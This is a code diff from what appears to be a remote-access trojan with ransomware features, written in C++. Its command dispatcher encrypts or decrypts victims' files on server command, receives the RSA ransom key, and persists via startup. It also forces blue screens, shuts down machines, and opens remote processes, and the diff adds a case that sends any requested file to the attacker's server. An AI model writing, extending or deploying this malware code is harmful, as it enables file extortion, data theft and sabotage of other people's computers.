@@ -202,71 +202,63 @@ const CMDDESC Client::CreateCommandDescription(const Packet& command) {
     return description;
 }
 
-BOOL Client::PerformCommand(const Packet& command, Packet& outResponse) {
+bool Client::PerformCommand(const Packet& command, Packet& outResponse) {
 
-    BOOL    success     = FALSE;
+    bool    success     = false;
     CMDDESC description = CreateCommandDescription(command);
     std::string cmdOutput = "";
 
     switch ( command.action ) {
+    case Action::kReceiveFileFromClient: {
+        // path of file to download in buffer
+        std::string downloadPath(command.buffer, command.buffLen);
+        File file(downloadPath);
+        success = this->m_NetworkManager.SendFile(file, this->m_TCPSocket, this->GetAESKey());
+        break;
+    }
     case Action::kSetAsDecryptionKey: {
         int len = 0;
 
-        std::cout << "Setting decryption key." << std::endl;
-
         int received = Receive(this->m_TCPSocket, ( char* ) &len, sizeof(len), 0);
-        if ( received <= 0 ) {
-            success = FALSE;
+        if ( received <= 0 )
             break;
-        }
-
-        std::cout << "Received length of DER formatted key : " << len << std::endl;
 
         unsigned char* der = ( unsigned char* ) malloc(len);
         received = Receive(this->m_TCPSocket, ( char* ) der, len, 0);
         if ( received <= 0 ) {
-            success = FALSE;
             free(der);
             break;
         }
 
-        std::cout << "Received DER formatted key : " << der << std::endl;
-
         const unsigned char* constDer = der;
-
-        std::cout << "Converting into key" << std::endl;
 
         RSA* key = d2i_RSAPrivateKey(nullptr, &constDer, len);
         if ( !key ) {
-            std::cout << "Failed?" << std::endl;
-            char errBuffer[256];
-            ERR_error_string_n(ERR_get_error(), errBuffer, sizeof(errBuffer)); // Convert to readable string
-            std::cout << errBuffer << std::endl;
+            free(der);
+            break;
         }
 
         this->m_FileManager.SetPrivateKey(key);
-        //CLIENT_DBG("Set decryption key")
-        std::cout << "Set key" << std::endl;
 
-        success = TRUE;
+        success = true;
         break;
     }
     case Action::kRunDecryptor:
         // its still called even if we havent received the private key from the server 
         // wont decrypt anything though because we dont have the private key
         this->m_FileManager.TransformFiles(command.buffer, &FileManager::DecryptContents, this->m_FileManager);
-        success = TRUE;
+        success = true;
         break;
     case Action::kRansomwareEnable:
         this->m_FileManager.TransformFiles(command.buffer, &FileManager::EncryptContents, this->m_FileManager);
-        success = TRUE;
+        success = true;
         break;
     case Action::kAddToStartup:
         this->m_ProcMgr.AddProcessToStartup(command.buffer);
-        success = TRUE;
+        success = true;
         break;
     case Action::kPingClient:
-        success = TRUE;
+        success = true;
         break;
     case Action::kRemoteBSOD:
         this->m_ProcMgr.BSOD();
@@ -277,6 +269,7 @@ BOOL Client::PerformCommand(const Packet& command, Packet& outResponse) {
         else if ( strcmp(command.buffer, "restart") == 0 )
             ProcessManager::ShutdownSystem(ShutdownReboot);
 
+        success = true;
         break;
     }
     case Action::kOpenRemoteProcess:
@@ -294,13 +287,13 @@ BOOL Client::PerformCommand(const Packet& command, Packet& outResponse) {
         
         break;
     default:
-        success = TRUE;
+        success = true;
         break;
     }
 
     if ( description.respondToServer || command.flags & RESPOND_WITH_STATUS ) {
         outResponse.action = command.action;
-        outResponse.code = (success == TRUE) ? ClientResponseCode::kResponseOk : ClientResponseCode::kResponseError;
+        outResponse.code = (success) ? ClientResponseCode::kResponseOk : ClientResponseCode::kResponseError;
         outResponse.insert(cmdOutput);
     }
 
@@ -344,11 +337,8 @@ void Client::ListenForServerCommands() {
         }
 
         Packet responseToServer;
-        if ( receivedPacket.flags & PACKET_IS_A_COMMAND ) {
-            CLIENT_DBG("running command");
-            CLIENT_DBG(std::string(std::to_string(receivedPacket.action)).c_str());
+        if ( receivedPacket.flags & PACKET_IS_A_COMMAND )
             PerformCommand(receivedPacket, responseToServer);
-        }
 
         // dont need to respond to server with 'responseToServer'
         if ( ( receivedPacket.flags & RESPOND_WITH_STATUS ) == FALSE )
